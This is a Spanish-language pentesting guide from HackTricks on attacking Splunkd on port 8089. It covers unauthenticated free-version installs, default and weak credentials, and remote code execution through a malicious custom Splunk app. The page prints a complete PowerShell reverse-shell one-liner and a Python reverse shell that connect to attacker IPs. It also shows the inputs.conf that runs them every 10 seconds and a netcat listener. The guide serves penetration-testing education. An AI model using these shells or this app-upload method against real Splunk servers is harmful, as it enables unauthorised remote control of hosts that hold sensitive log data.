# 8089 - Pentesting Splunkd

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## **Informaci贸n B谩sica**

Splunk es una herramienta de **an谩lisis de registros** que desempe帽a un papel crucial en la **recopilaci贸n, an谩lisis y visualizaci贸n de datos**. Aunque su prop贸sito inicial no era servir como una herramienta de **SIEM (Seguridad de la Informaci贸n y Gesti贸n de Eventos)**, ha ganado popularidad en el 谩mbito del **monitoreo de seguridad** y **anal铆tica empresarial**.

Las implementaciones de Splunk se utilizan con frecuencia para almacenar **datos sensibles** y pueden servir como una **fuente valiosa de informaci贸n** para posibles atacantes si logran comprometer el sistema. **Puerto predeterminado:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
El **servidor web de Splunk se ejecuta de forma predeterminada en el puerto 8000**.
{% endhint %}

## Enumeraci贸n

### Versi贸n Gratuita

La prueba de Splunk Enterprise se convierte en una **versi贸n gratuita despu茅s de 60 d铆as**, la cual **no requiere autenticaci贸n**. No es raro que los administradores de sistemas instalen una prueba de Splunk para probarlo, la cual es **posteriormente olvidada**. Esto se convertir谩 autom谩ticamente en la versi贸n gratuita que no tiene ning煤n tipo de autenticaci贸n, introduciendo un agujero de seguridad en el entorno. Algunas organizaciones pueden optar por la versi贸n gratuita debido a restricciones presupuestarias, sin comprender completamente las implicaciones de no tener gesti贸n de usuarios/roles.

### Credenciales Predeterminadas

En versiones antiguas de Splunk, las credenciales predeterminadas son **`admin:changeme`**, las cuales se muestran convenientemente en la p谩gina de inicio de sesi贸n.\
Sin embargo, **la 煤ltima versi贸n de Splunk** establece **credenciales** **durante el proceso de instalaci贸n**. Si las credenciales predeterminadas no funcionan, vale la pena verificar contrase帽as d茅biles comunes como `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

### Obtener Informaci贸n

Una vez iniciada la sesi贸n en Splunk, podemos **navegar por datos**, ejecutar **informes**, crear **paneles de control**, **instalar aplicaciones** desde la biblioteca de Splunkbase e instalar aplicaciones personalizadas.\
Tambi茅n se puede ejecutar c贸digo: Splunk tiene m煤ltiples formas de **ejecutar c贸digo**, como aplicaciones Django del lado del servidor, puntos finales REST, entradas script y scripts de alerta. Un m茅todo com煤n para obtener ejecuci贸n de c贸digo remoto en un servidor Splunk es a trav茅s del uso de una entrada script.

Adem谩s, como Splunk se puede instalar en hosts Windows o Linux, se pueden crear entradas script para ejecutar scripts Bash, PowerShell o Batch.

### Shodan

* `Construcci贸n de Splunk`

## RCE

### Crear Aplicaci贸n Personalizada

Una aplicaci贸n personalizada puede ejecutar **scripts de Python, Batch, Bash o PowerShell**.\
Ten en cuenta que **Splunk viene con Python instalado**, por lo que incluso en sistemas **Windows** podr谩s ejecutar c贸digo python.

Puedes usar [**esto**](https://github.com/0xjpuff/reverse\_shell\_splunk) paquete de Splunk para ayudarnos. El directorio **`bin`** en este repositorio tiene ejemplos para [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) y [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Vamos a seguir esto paso a paso.

Para lograr esto, primero necesitamos crear una aplicaci贸n personalizada de Splunk utilizando la siguiente estructura de directorio:
```shell-session
tree splunk_shell/

splunk_shell/
 bin
 default
```
El directorio **`bin`** contendr谩 cualquier **script que tengamos la intenci贸n de ejecutar** (en este caso, un **shell inverso de PowerShell**), y el directorio predeterminado tendr谩 nuestro archivo `inputs.conf`. Nuestro shell inverso ser谩 un **comando de una sola l铆nea de PowerShell:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
El archivo [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) indica a Splunk **qu茅 script ejecutar** y cualquier otra condici贸n. Aqu铆 establecemos la aplicaci贸n como habilitada y le indicamos a Splunk que ejecute el script cada 10 segundos. El intervalo siempre se establece en segundos, y la entrada (script) solo se ejecutar谩 si esta configuraci贸n est谩 presente.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Necesitamos el archivo `.bat`, que se ejecutar谩 cuando se implemente la aplicaci贸n y ejecutar谩 la l铆nea de comandos de PowerShell.

El siguiente paso es elegir `Instalar aplicaci贸n desde archivo` y cargar la aplicaci贸n.

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

Antes de cargar la aplicaci贸n personalizada maliciosa, iniciemos un escucha usando Netcat o [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
En la p谩gina `Subir aplicaci贸n`, haz clic en examinar, elige el archivo tarball que creamos anteriormente y haz clic en `Subir`. Tan pronto como **subamos la aplicaci贸n**, recibiremos una **shell inversa** ya que el estado de la aplicaci贸n cambiar谩 autom谩ticamente a `Habilitado`.

#### Linux

Si estuvi茅ramos tratando con un **anfitri贸n Linux**, necesitar铆amos **editar el script Python `rev.py`** antes de crear el archivo tarball y subir la aplicaci贸n maliciosa personalizada. El resto del proceso ser铆a el mismo y obtendr铆amos una conexi贸n de shell inversa en nuestro escuchador de Netcat y estar铆amos listos para empezar.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Escalada de Privilegios

En la siguiente p谩gina puedes encontrar una explicaci贸n de c贸mo este servicio puede ser abusado para escalar privilegios y obtener persistencia:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Referencias

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
